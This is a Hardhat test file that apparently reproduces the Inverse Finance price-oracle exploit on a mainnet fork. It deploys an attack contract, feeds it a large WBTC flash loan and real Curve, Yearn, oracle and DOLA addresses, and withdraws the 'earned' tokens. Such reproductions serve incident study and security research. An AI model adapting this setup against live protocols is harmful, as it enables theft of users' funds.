import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { Attack__factory, Attack, ERC20Mock } from "../typechain-types";
import {
  deployContractFromName,
  getBigNumber,
  getERC20ContractFromAddress,
  getErc20Balance,
} from "../utils";
import { ERC20Token } from "../constants/token";

describe("Attack", () => {
  let Attack: Attack;
  let inverseFinanceExploiter: SignerWithAddress;
  let WBTC: ERC20Mock;
  let USDT: ERC20Mock;
  before(async () => {
    [inverseFinanceExploiter] = await ethers.getSigners();
    WBTC = await getERC20ContractFromAddress(ERC20Token.WBTC.address);
    USDT = await getERC20ContractFromAddress(ERC20Token.USDT.address);
  });

  beforeEach(async () => {
    const aavePoolAddressesProvider =
      "0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5";
    Attack = await deployContractFromName("Attack", Attack__factory, [
      aavePoolAddressesProvider,
    ]);
    await Attack.deployed();
  });

  it("attack", async function () {
    const curvePool = "0xD51a44d3FaE010294C616388b506AcdA1bfAAE46";
    const initAmount = getBigNumber(27000, ERC20Token.WBTC.decimals);
    const crv3crypto = "0xc4AD29ba4B3c580e6D59105FFf484999997675Ff";
    const yearnVault = "0xE537B5cc158EB71037D4125BDD7538421981E6AA";
    const YVCrv3CryptoFeed = "0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C";
    const Crv = "0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490";
    const Dola = "0x865377367054516e17014CcdED1e7d814EDC9ce4";
    const depositAmount = getBigNumber(225, ERC20Token.WBTC.decimals);

    await expect(
      Attack.start({
        assets: [ERC20Token.WBTC.address],
        amounts: [initAmount],
        modes: [0],
        curvePool: curvePool,
        depositAmount: depositAmount,
        crv3crypto: crv3crypto,
        yearnVault: yearnVault,
        YVCrv3CryptoFeed: YVCrv3CryptoFeed,
        USDT: ERC20Token.USDT.address,
        Crv: Crv,
        Dola: Dola,
      })
    ).to.not.reverted;

    // withdraw WBTC and USDT from the attack contract
    await expect(Attack.withdrawErc20(ERC20Token.WBTC.address)).not.to.reverted;
    await expect(Attack.withdrawErc20(ERC20Token.USDT.address)).not.to.reverted;

    // check WBTC and USDT balance of the inverse finance exploiter
    await getErc20Balance(
      WBTC,
      inverseFinanceExploiter.address,
      "WBTC Earned",
      8
    );
    await getErc20Balance(
      USDT,
      inverseFinanceExploiter.address,
      "USDT Earned",
      6
    );
  });
});
